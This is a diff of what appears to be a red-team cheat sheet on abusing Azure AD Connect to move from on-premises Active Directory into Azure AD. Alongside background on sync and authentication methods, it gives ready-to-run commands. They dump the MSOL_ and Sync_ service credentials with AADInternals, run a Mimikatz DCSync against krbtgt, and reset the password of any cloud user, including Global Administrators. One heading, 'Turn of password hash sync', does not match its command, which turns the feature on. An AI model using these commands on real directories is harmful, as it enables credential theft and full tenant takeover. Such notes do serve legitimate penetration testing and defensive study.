@@ -128,38 +128,63 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 
 # On-Prem --> Azure AD
 - https://aadinternals.com/post/on-prem_admin/
+
 ## Azure AD Connect
-- Check if there is an account name with `MSOL_<INSTALLATION ID>`. This user has DCSYNC rights. (or `AAD_` if installed on a DC)
-- Command to check if AD connect is installed on the server `Get-ADSyncConnector`
+- Azure AD connect features available for each authenticaton method:
+	 -   **Synchronization**. Responsible for creating users, groups, and other objects. As well as, making sure identity information for your on-premises users and groups is matching the cloud. This synchronization also includes password hashes.
+	 -   **Health Monitoring**. Azure AD Connect Health can provide robust monitoring and provide a central location in the Azure portal to view this activity.
+- Authentication methods:
+	 - **Cloud authentication**. Azure AD handles users' sign-in process. Coupled with seamless single sign-on (SSO), users can sign in to cloud apps without having to reenter their credentials. With cloud authentication, you can choose from two options:
+		 - **Azure AD password hash synchronization**. The simplest way to enable authentication for on-premises directory objects in Azure AD. Users can use the same username and password that they use on-premises without having to deploy any additional infrastructure. Some premium features of Azure AD, like Identity Protection and Azure AD Domain Services, require password hash synchronization, no matter which authentication method you choose.
+		 - **Azure AD Pass-through authentication**. Provides a simple password validation for Azure AD authentication services by using a software agent that runs on one or more on-premises servers. The servers validate the users directly with your on-premises Active Directory, which ensures that the password validation doesn't happen in the cloud. Companies with a security requirement to immediately enforce on-premises user account states, password policies, and sign-in hours might use this authentication method.
+	 - **Federated authentication**. When you choose the Federated authentication method, Azure AD hands off the authentication process to a separate trusted authentication system, such as on-premises Active Directory Federation Services (AD FS), to validate the user’s password. The authentication system can provide additional advanced authentication requirements. Examples are smartcard-based authentication or third-party multifactor authentication.
+- Azure AD Identity Protection requires Password Hash Sync regardless of which sign-in method you choose, to provide the Users with leaked credentials report.
 
-## Password Hash Sync Abuse
-- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
-- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
 
-#### Enumerate server where Azure AD is installed (on prem command)
+- When Azure AD Connect is configured. The `SYNC_` account and `MSOL_` account are created. (or `AAD_` if installed on a DC)
+- The `SYNC_` account has the role `Directory Synchronization Accounts` and can reset any password within the cloud and the `MSOL_` and `AAD_` account have DCSync rights.
+- The role is now shown in the Azure portal [Documentation](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#roles-not-shown-in-the-portal)
+
+#### Enumerate server where Azure AD connect is installed (on prem command)
 ```
 Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
 ```
 
-#### Enumerate server where Azure AD is installed (Azure command)
+#### Enumerate server where Azure AD connect is installed (Azure command)
 ```
 Import-Module .\AzureAD.psd1
 Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
 ```
 
-#### Extract credentials from the server
+#### Check if AD Connect is installed on the server
+```
+Get-ADSyncConnector
+```
+
+#### Turn of password hash sync
+- AAD Connect service account can turn on Password hash sync
+```
+Set-AADIntPasswordHashSyncEnabled -Enabled $true
+```
+
+#### Dumping AAD Connect credentials
 ```
 Import-Module .\AADInternals.psd1
 Get-AADIntSyncCredentials
 ```
 
+## Password Hash Sync Abuse
+- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
+- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
+
+### Abusing On-Prem MSOL_ Account
 #### Run DCSync with creds of MSOL_* account
 ```
 runas /netonly /user:<DOMAIN>\MSOL_<ID> cmd 
 Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\krbtgt /domain:<DOMAIN> /dc:<DC NAME>"'
 ```
 
-### Reset password of any user
+### Reset password of cloud user
 - Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)
 
 #### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
@@ -178,6 +203,7 @@ Get-AADIntGlobalAdmins
 #### Get the ImmutableID
 ```
 Get-AADIntUser -UserPrincipalName <NAME> | select ImmutableId
+Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName
 ```
 
 #### Reset the Azure password
@@ -187,9 +213,10 @@ Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Ve
 
 #### Reset password for cloud only user
 - Need CloudAnchor ID which is the format ```<USER>_<OBJECTID>```
+- Might be fixed already!
 ```
 Import-Module .\AADInternals.psd1
- Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
+Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
 Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
 ```
 
